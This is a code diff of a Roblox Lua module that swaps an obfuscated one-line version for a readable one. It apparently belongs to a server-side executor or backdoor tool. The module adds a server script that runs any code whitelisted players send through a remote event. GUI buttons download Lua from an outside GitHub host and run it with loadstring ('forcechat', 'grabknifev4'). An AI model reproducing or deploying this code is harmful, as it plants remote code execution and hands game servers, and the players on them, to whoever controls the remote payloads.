@@ -1,1 +1,73 @@
-local v0={};v0.init=function(v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18,v19) local v20=1385 -(1103 + 282) ;local v21;local v22;local v23;local v24;local v25;while true do if (v20==(3 + 0)) then function v25() local v26=350 -(87 + 263) ;local v27;while true do if (v26==(180 -(67 + 113))) then v27=Instance.new("Script",v16:FindFirstChild("scroll"):FindFirstChild("grabknifev4"));v27.Name="request";v26=1 + 0 ;end if (v26==(443 -(416 + 26))) then v16:FindFirstChild("scroll"):FindFirstChild("grabknifev4").MouseButton1Click:Connect(function() local v36=0 -0 ;local v37;while true do if (v36==(0 + 0)) then v37=v3.Parent;if v37 then if v37:IsA("PlayerGui") then if (v21==nil) then v21=v3.Parent.Parent;end if ( not v3.Parent:FindFirstChild("V4Gui") or  not v3.Parent:FindFirstChild("MainGui")) then local v46=0 + 0 ;local v47;while true do if (v46==(0 -0)) then v47=v22(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/gbv4/u.lua",true))();v47.init(v21);break;end end end end end break;end end end);break;end end end coroutine.wrap(v25)();break;end if (v20==(953 -(802 + 150))) then function v23() local v28=0 -0 ;local v29;local v30;while true do if (v28==(1 -0)) then v30={execute=v29.Parent:WaitForChild("execute",72789 + 27210 )};v30.execute.OnServerEvent:Connect(function(v38,v39) local v40=0 + 0 ;local v41;while true do if ((998 -(915 + 82))==v40) then if (v41==true) then v22(v39)();end break;end if (v40==(0 -0)) then if (v21==nil) then v21=v38;end v41=game:GetService("ReplicatedStorage"):FindFirstChild("returnwhitelistsrv"):Invoke(v38);v40=4 -3 ;end end end);break;end if (v28==(0 + 0)) then v29=Instance.new("Script",v3);v29.Name="servercm";v28=1 + 0 ;end end end coroutine.wrap(v23)();v24=nil;v20=2 -0 ;end if (v20==0) then v21=nil;v22=require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring",101186 -(1069 + 118) ));v23=nil;v20=3 -2 ;end if (v20==(4 -2)) then function v24() local v31=0 -0 ;local v32;while true do if (v31==(1 + 0)) then v16:FindFirstChild("scroll"):FindFirstChild("forcechat").MouseButton1Click:Connect(function() local v42=v3.Parent;if v42 then if v42:IsA("PlayerGui") then local v44=0;while true do if (v44==(0 -0)) then if (v21==nil) then v21=v3.Parent.Parent;end if  not v3.Parent:FindFirstChild("forcechat") then local v49=0 + 0 ;local v50;while true do if (v49==(0 + 0)) then v50=v22(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/u.lua",true))();v50.init(v21);break;end end end break;end end end end end);break;end if (v31==(0 + 0)) then v32=Instance.new("Script",v16:FindFirstChild("scroll"):FindFirstChild("forcechat"));v32.Name="request";v31=792 -(368 + 423) ;end end end coroutine.wrap(v24)();v25=nil;v20=3;end end end;return v0;
+local module = {}
+
+function module:init(exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
+    local player = nil
+    local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))
+
+	local function SELVO_fake_script()
+		local script = Instance.new('Script', exec)
+		script.Name = "servercm"
+		
+		local remotes = {
+			execute = script.Parent:WaitForChild("execute", 99999);
+		}
+
+		remotes.execute.OnServerEvent:Connect(function(playere, code)
+            if player == nil then player = playere end
+			local eligible = game:GetService("ReplicatedStorage"):FindFirstChild("returnwhitelistsrv"):Invoke(playere)
+			
+			if eligible == true then
+				loadstring(code)()
+			end
+		end)
+	end
+	coroutine.wrap(SELVO_fake_script)()
+
+    local function SDOON_fake_script()
+        local script = Instance.new('Script', otherscripts:FindFirstChild("scroll"):FindFirstChild("forcechat"))
+        script.Name = "request"
+
+        otherscripts:FindFirstChild("scroll"):FindFirstChild("forcechat").MouseButton1Click:Connect(function()
+            local playergui = exec.Parent
+
+            if playergui then
+                if playergui:IsA("PlayerGui") then
+                    if player == nil then player = exec.Parent.Parent end
+
+                    if not exec.Parent:FindFirstChild("forcechat") then
+                        local fcmain = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/u.lua", true))()
+
+		                fcmain.init(player)
+                    end
+                end
+            end
+        end)
+    end
+    coroutine.wrap(SDOON_fake_script)()
+
+	 local function more_fake_script()
+        local script = Instance.new('Script', otherscripts:FindFirstChild("scroll"):FindFirstChild("grabknifev4"))
+        script.Name = "request"
+
+        otherscripts:FindFirstChild("scroll"):FindFirstChild("grabknifev4").MouseButton1Click:Connect(function()
+            local playergui = exec.Parent
+
+            if playergui then
+                if playergui:IsA("PlayerGui") then
+                    if player == nil then player = exec.Parent.Parent end
+
+                    if not exec.Parent:FindFirstChild("V4Gui") or not exec.Parent:FindFirstChild("MainGui") then
+                        local loadstrng = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/gbv4/u.lua", true)
+                        task.wait(5)
+                        local grabknifemain = loadstring(loadstrng)()
+
+		                grabknifemain.init(player)
+                    end
+                end
+            end
+        end)
+    end
+    coroutine.wrap(more_fake_script)()
+end
+
+return module
